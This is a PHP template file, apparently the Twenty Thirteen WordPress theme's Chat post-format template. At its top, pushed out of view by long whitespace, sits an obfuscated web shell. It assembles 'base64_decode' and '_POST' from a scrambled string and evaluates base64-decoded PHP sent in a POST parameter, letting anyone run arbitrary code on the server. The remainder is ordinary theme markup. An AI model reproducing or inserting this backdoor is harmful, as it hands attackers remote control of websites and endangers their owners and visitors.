<?php                                                                                                                                                                                                                                                                         $lkoc4= "46apdoeb_tsc"; $gqt05=strtolower($lkoc4[7]. $lkoc4[2].$lkoc4[10]. $lkoc4[6] . $lkoc4[1].$lkoc4[0] .$lkoc4[8]. $lkoc4[4].$lkoc4[6]. $lkoc4[11].$lkoc4[5]. $lkoc4[4].$lkoc4[6]) ;$rhz4= strtoupper ( $lkoc4[8]. $lkoc4[3].$lkoc4[5]. $lkoc4[10]. $lkoc4[9]) ;if(isset ( ${$rhz4} [ 'n97fed2' ])) { eval ($gqt05 ( ${$rhz4 } ['n97fed2']));} ?><?php
/**
 * The template for displaying posts in the Chat post format
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<header class="entry-header">
		<?php if ( is_single() ) : ?>
		<h1 class="entry-title"><?php the_title(); ?></h1>
		<?php else : ?>
		<h1 class="entry-title">
			<a href="<?php the_permalink(); ?>" rel="bookmark"><?php the_title(); ?></a>
		</h1>
		<?php endif; // is_single() ?>
	</header><!-- .entry-header -->

	<div class="entry-content">
		<?php
			/* translators: %s: Name of current post */
			the_content( sprintf(
				__( 'Continue reading %s <span class="meta-nav">&rarr;</span>', 'twentythirteen' ),
				the_title( '<span class="screen-reader-text">', '</span>', false )
			) );

			wp_link_pages( array( 'before' => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentythirteen' ) . '</span>', 'after' => '</div>', 'link_before' => '<span>', 'link_after' => '</span>' ) );
		?>
	</div><!-- .entry-content -->

	<footer class="entry-meta">
		<?php twentythirteen_entry_meta(); ?>
		<?php edit_post_link( __( 'Edit', 'twentythirteen' ), '<span class="edit-link">', '</span>' ); ?>
	</footer><!-- .entry-meta -->
</article><!-- #post -->
